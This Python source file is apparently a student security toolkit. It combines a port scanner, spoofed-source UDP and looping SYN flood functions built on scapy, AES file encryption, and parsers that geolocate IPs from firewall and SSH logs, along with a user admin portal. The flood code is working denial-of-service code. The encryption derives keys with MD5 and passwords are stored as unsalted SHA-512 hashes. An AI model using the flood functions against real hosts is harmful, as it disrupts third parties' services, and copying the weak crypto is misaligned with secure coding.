import socket, sys, os, re, csv, time, subprocess, sqlite3, geoip2.database, getpass
from datetime import datetime
from hashlib import md5
from Cryptodome.Cipher import AES
from os import urandom
from scapy.all import IP, TCP, UDP, RandShort, Raw, send, RandIP
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle
from prettytable import PrettyTable
from Crypto.Hash import SHA512

class Portscan:

    def singlePortScan(self, ip, r1, r2):

        print("\nScanner is working on ", ip)
        t1 = datetime.now()
        try:
            for port in range(r1, r2):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    print("Port Open:\t", port)
                sock.close()
        except KeyboardInterrupt:
            print("You stopped this")
            sys.exit()
        except socket.gaierror:
            print("Hostname could not be resolved")
            sys.exit()
        except socket.error:
            print("Could not connect to server")
            sys.exit()
        t2 = datetime.now()
        # Calculates time spent executing
        total = t2 - t1
        print("Scanning complete in ", total)

    # PortScan from multiple IP Addresses 
    def multiplePortScan(self, ipList, r1, r2):
        i = 0
        print(ipList)
        t1 = datetime.now()
        try:
            for x in ipList:
                print("\nScanner is working on ", ipList[i])
                
                for port in range(r1, r2):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    socket.setdefaulttimeout(1)
                    result = sock.connect_ex((ipList[i], port))
                    print("Testing Port", port)
                    if result == 0:
                        print("Port Open:\t", port)
                    sock.close()
                i = i + 1

        except KeyboardInterrupt:
            print("You stopped this")
            sys.exit()
        except socket.gaierror:
            print("Hostname could not be resolved")
            sys.exit()
        except socket.error:
            print("Could not connect to server")
            sys.exit()
        t2 = datetime.now()
        total = t2 - t1
        print("\nScanning complete in ", total)        
        time.sleep(4)
           

class flood:
    
    def udpFlood(self, dst_ip, dst_port, num):

        # Define the data to send in the UDP packet
        data = "Hello, world! and Goodbye!"
        x = 0
        while x <= num:
            src_ip = RandIP()
            udp_packet = IP(src=src_ip, dst=dst_ip) / UDP(sport=RandShort(), dport=dst_port) / Raw(load=data)
            send(udp_packet)
            x += 1
        print(f"\nSent {num} packets to {dst_ip}:{dst_port}")
        time.sleep(3)

    def synFlood(self, target_ip, target_port):
        
        ip = IP(dst=target_ip)
        tcp = TCP(sport=RandShort(), dport = target_port, flags = "S")

        raw = Raw(b"X"*1024)

        p = ip / tcp / raw

        send(p, loop = 1, verbose = 1)



class IM:

    def server(self):
        print("Server started")
        subprocess.call('start cmd /k python scripts/server.py', shell=True)

    def client(self):
        print("New Client Launched")
        subprocess.call('start cmd /k python scripts/client.py', shell=True)

class files:
    
    def listFiles(self):
        # Get the current working directory
        cwd = os.getcwd()

        # List all files in the directory
        files = os.listdir(cwd + "/export/")

        # Print the list of files
        for file in files:
            print(file)


    def derive_key_and_iv(self, password, salt, key_length, iv_length): #derive key and IV from password and salt.
        d = d_i = b''
        while len(d) < key_length + iv_length:
            d_i = md5(d_i + str.encode(password) + salt).digest() #obtain the md5 hash value
            d += d_i
        return d[:key_length], d[key_length:key_length+iv_length]

    def encrypt(self, in_file, out_file, password, key_length=32):
        bs = AES.block_size #16 bytes
        salt = urandom(bs) #return a string of random bytes
        key, iv = self.derive_key_and_iv(password, salt, key_length, bs)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        out_file.write(salt)
        finished = False

        while not finished:
            chunk = in_file.read(1024 * bs) 
            if len(chunk) == 0 or len(chunk) % bs != 0:#final block/chunk is padded before encryption
                padding_length = (bs - len(chunk) % bs) or bs
                chunk += str.encode(padding_length * chr(padding_length))
                finished = True
            out_file.write(cipher.encrypt(chunk))

    def decrypt(self, in_file, out_file, password, key_length=32):
        bs = AES.block_size
        salt = in_file.read(bs)
        key, iv = self.derive_key_and_iv(password, salt, key_length, bs)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        next_chunk = ''
        finished = False
        while not finished:
            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))
            if len(next_chunk) == 0:
                padding_length = chunk[-1]
                chunk = chunk[:-padding_length]
                finished = True 
            out_file.write(bytes(x for x in chunk)) 

class logs:

    def readMikrotik(self):

        # Open the GeoLite2 database
        reader = geoip2.database.Reader('./db/GeoLite2-City.mmdb')

        # Define a function to get the location for an IP address
        def get_location(ip):
            try:
                response = reader.city(ip)
                return response.country.name
            except geoip2.errors.AddressNotFoundError:
                return None

        # Create a PrettyTable object and add columns
        table = PrettyTable()
        table.field_names = ["Date/Time", "Source IP", "Source Country", "Destination IP", "Destination Country"]
        conn = sqlite3.connect('./db/mainDB.db')    
        with open('./logs/ufw.log', 'r') as f:
            data = [("Date/Time", "Source IP", "Source Country", "Destination IP", "Destination Country")]
            for line in f:
                date_time = re.search(r'^(\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})', line).group(1)
                source_ip = re.search(r'SRC=([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', line).group(1)
                dest_ip = re.search(r'DST=([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', line).group(1)
                src_country = get_location(source_ip)
                dst_country = get_location(dest_ip)
                data.append([date_time, source_ip, src_country, dest_ip, dst_country]) 
                # Creates a Table to show
                table.add_row([date_time, source_ip, src_country, dest_ip, dst_country]) 
                # Inserts into DB   
                conn.execute("INSERT INTO mikrotik_logs (date, src_ip, src_country, dst_ip, dst_country) VALUES (?, ?, ?, ?, ?)", (date_time, source_ip, src_country, dest_ip, dst_country))


        # Print the table
        print(table)
        conn.commit()
        conn.close()

        while True:
            exportinp = input("Do you want to export to file? (y/n) ")
            if exportinp == "y":
                optionExport = input("Do you want to save as PDF or CSV? ")
                if optionExport == "pdf":
                    e = export()
                    e.generatePdf("Mikrotik_logs", data)
                    time.sleep(3)
                    break
                elif optionExport == "csv":
                    e = export()
                    e.generateCsv("Mikrotik_logs", data)
                    time.sleep(3)
                    break
            elif exportinp == "n" :
                break
            else:
                print("Invalid Option")

        # Close the GeoLite2 database
        reader.close()
    
    def readSSHLogs(self):

        # Open the GeoLite2 database
        reader = geoip2.database.Reader('./db/GeoLite2-City.mmdb')

        # Define a function to get the location for an IP address
        def get_location(ip):
            try:
                response = reader.city(ip)
                return response.country.name
            except geoip2.errors.AddressNotFoundError:
                return None

        # Create a PrettyTable object and add columns for invalid users
        table = PrettyTable()
        table.field_names = ["Date/Time", "Username", "Ip Address", "Ip Country"]
        conn = sqlite3.connect('./db/mainDB.db')
            
        with open('./logs/auth.log', 'r') as f:
            data = [("Date/Time", "Username", "Ip Address", "Ip Country")]
            pattern = r"(\w{3}\s+\d{1,2}\s\d{2}:\d{2}:\d{2})\s\w+\ssshd\[\d+\]:\sInvalid user (\w+) from ([\d\.]+)"

            for line in f:
                for line in f:
                    match = re.search(pattern, line)
                    if match:
                        date_time = match.group(1)
                        username = match.group(2)
                        ip_address = match.group(3)
                        ip_country = get_location(ip_address)
                        data.append([date_time, username, ip_address, ip_country]) 
                        table.add_row([date_time, username, ip_address, ip_country])    
                        conn.execute("INSERT INTO ssh_logs (date, user, ip, country) VALUES (?, ?, ?, ?)", (date_time, username, ip_address, ip_country,))


        # Print the table
        print("List of Invalid Login Attempts")
        print(table)
        conn.commit()
        conn.close()

        while True:
            exportinp = input("Do you want to export to file? (y/n) ")
            if exportinp == "y":
                optionExport = input("Do you want to save as PDF or CSV? ")
                if optionExport == "pdf":
                    e = export()
                    e.generatePdf("SSH_login_fails", data)
                    time.sleep(3)
                    break
                elif optionExport == "csv":
                    e = export()
                    e.generateCsv("SSH_login_fails", data)
                    time.sleep(3)
                    break
            elif exportinp == "n" :
                break
            else:
                print("Invalid Option")

        # Close the GeoLite2 database
        reader.close()

                
class export:

    def generatePdf(self, filename, data):
        # Define a style for the table
        style = TableStyle([('BACKGROUND', (0, 0), (-1, 0), '#CCCCCC'),
                            ('TEXTCOLOR', (0, 0), (-1, 0), '#000000'),
                            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                            ('FONTSIZE', (0, 0), (-1, 0), 14),
                            ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                            ('BACKGROUND', (0, 1), (-1, -1), '#F7F7F7'),
                            ('TEXTCOLOR', (0, 1), (-1, -1), '#000000'),
                            ('FONTNAME', (0, 1), (-1, -1), 'Helvetica'),
                            ('FONTSIZE', (0, 1), (-1, -1), 12),
                            ('BOTTOMPADDING', (0, 1), (-1, -1), 10)])

        # Create a table object with the data and style
        table = Table(data)
        table.setStyle(style)

        # Create a PDF file and add the table to it
        pdf_file = SimpleDocTemplate('./export/' + filename + '.pdf', pagesize=A4)
        pdf_file_title = "Mikrotik Log"
        styles = getSampleStyleSheet()
        pdf_file_name = './export/' + filename + '.pdf'
        pdf_file.build([table])

        print(f"The PDF has been saved to {pdf_file_name}")

    
    def generateCsv(self, filename, data):
        with open("./export/" + filename + ".csv", "w", newline="") as csvfile:
            csvdoc = csv.writer(csvfile)
            csvdoc.writerows(data)
            print(f"The CSV has been saved to ./export/" + filename + ".csv")

class UserPortal: 

    def listUsers(self):
        conn = sqlite3.connect('./db/mainDB.db') 
        print("Listing All Users in Database")
        rows = conn.execute("SELECT * FROM Users").fetchall()
        for row in rows:
            print(f"\nID: {row[0]}")
            print(f"Username: {row[1]}")
            print(f"Name: {row[2]}")
            roleRows = conn.execute("SELECT * FROM Roles WHERE id = ?", (row[3],)).fetchall()
            for roleRow in roleRows:
                print(f"Role: {roleRow[1]}")
            print(f"Password: {row[4]}")
            print(f"Date of Creation: {row[5]}")
        conn.close()
        time.sleep(5)

    def createUser(self):
        conn = sqlite3.connect('./db/mainDB.db')  
        print("User Creation\n")
        username = input("Enter the Username: ")
        name = input("Enter the Name: ")
        role = input("Enter the Role - 1 > for Admin | 2 > for User: ")
        password = getpass.getpass('Password: ').encode()
        password = SHA512.new(password).hexdigest()
        now = datetime.now()
        datenow = now.strftime("%d/%m/%y")

        conn.execute("INSERT INTO Users (username, name, role, password, date_created) VALUES (?, ?, ?, ?, ?)", (username, name, role, password, datenow,))
        conn.commit()
        print(f"User: {username} created")
        conn.close()
        time.sleep(2)

    def updatePassword(self):
            conn = sqlite3.connect('./db/mainDB.db')
            print("Change User Password\n")
            username = input("Enter the Username: ")
            while True:
                password = getpass.getpass("Enter the New Password: ")
                password2 = getpass.getpass("Enter the New Password Again: ")
                if password != password2:
                    print("Passwords don't match")
                else:
                    break
            password = password.encode()
            password = SHA512.new(password).hexdigest()
            conn.execute("UPDATE Users SET password=? WHERE username=?;", (password, username))
            conn.commit()
            print(f"User {username} password updated")
            conn.close()
            time.sleep(2)

    def deleteUser(self):
        conn = sqlite3.connect('./db/mainDB.db')
        print("Delete User\n")
        username = input("Enter the User to Delete: ")
        conn.execute("DELETE FROM Users WHERE username=?;", (username,))
        conn.commit()
        print(f"User {username} deleted")
        conn.close()
        time.sleep(2)
    
